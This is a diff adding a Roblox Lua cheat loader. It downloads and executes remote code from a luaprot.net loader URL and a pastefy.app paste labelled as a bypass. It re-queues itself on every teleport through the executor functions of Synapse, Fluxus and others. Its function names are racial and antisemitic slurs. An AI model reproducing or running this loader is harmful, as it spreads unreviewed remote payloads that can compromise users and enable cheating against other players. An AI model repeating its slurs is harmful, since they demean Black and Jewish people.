@@ -1,0 +1,79 @@
+local plrs = game:GetService("Players")
+local rs = game:GetService("ReplicatedStorage")
+local lp = plrs.LocalPlayer
+local luaprotauth = "https://luaprot.net/api/v3/loaders/get/49731659162184561521"
+local loaderstr = 'loadstring(game:HttpGet("' .. luaprotauth .. '"))()'
+
+local function nigger()
+    local ok, src = pcall(game.HttpGet, game, luaprotauth);
+    if not ok or type(src) ~= "string" then
+        return;
+    end;
+    local fn, err = loadstring(src);
+    if not fn then
+        return;
+    end;
+    local okR, errR = pcall(fn);
+    if not okR then
+    end;
+end;
+
+local function jew()
+    if type(queue_on_teleport) == "function" then
+        queue_on_teleport(loaderstr);
+    elseif syn and type(syn.queue_on_teleport) == "function" then
+        syn.queue_on_teleport(loaderstr);
+    elseif fluxus and type(fluxus.queue_on_teleport) == "function" then
+        fluxus.queue_on_teleport(loaderstr);
+    elseif type(queueonteleport) == "function" then
+        queueonteleport(loaderstr);
+    end;
+end;
+
+pcall(jew);
+
+local function sahur()
+    if not game:IsLoaded() then return false end;
+    local ch = lp.Character;
+    if not ch or not ch.Parent then return false end;
+    local hum = ch:FindFirstChildOfClass("Humanoid");
+    if not hum or hum.Health <= 0 then return false end;
+    local hrp = ch:FindFirstChild("HumanoidRootPart");
+    if not hrp or not hrp.Parent then return false end;
+    if not ch:FindFirstChild("ViewmodelController") then return false end;
+    if not ch:FindFirstChild("InventoryController") then return false end;
+    local remotes = rs:FindFirstChild("Remotes");
+    if not remotes then return false end;
+    local hasobf = false;
+    for _, c in ipairs(remotes:GetChildren()) do
+        if c:IsA("Folder") and #c.Name > 10 then
+            for _, g in ipairs(c:GetChildren()) do
+                if g:IsA("RemoteEvent") or g:IsA("UnreliableRemoteEvent") then
+                    hasobf = true;
+                    break;
+                end;
+            end;
+        end;
+        if hasobf then break end;
+    end;
+    if not hasobf then return false end;
+    local stamp = ch:GetAttribute("sahur");
+    local now = tick();
+    if not stamp then
+        ch:SetAttribute("sahur", now);
+        return false;
+    end;
+    return (now - stamp) >= 2;
+end;
+
+if sahur() then
+    nigger();
+else
+    rconsoleprint("Welcome to inverse! Join a server and the script will automatically load itself.. ;3")
+    task.spawn(function()
+        while not sahur() do task.wait(1) end;
+        local yeahopensourcebypassbro = loadstring(game:HttpGet("https://pastefy.app/4NWJWWCp/raw"))()
+        wait(10)
+        nigger();
+    end);
+end;
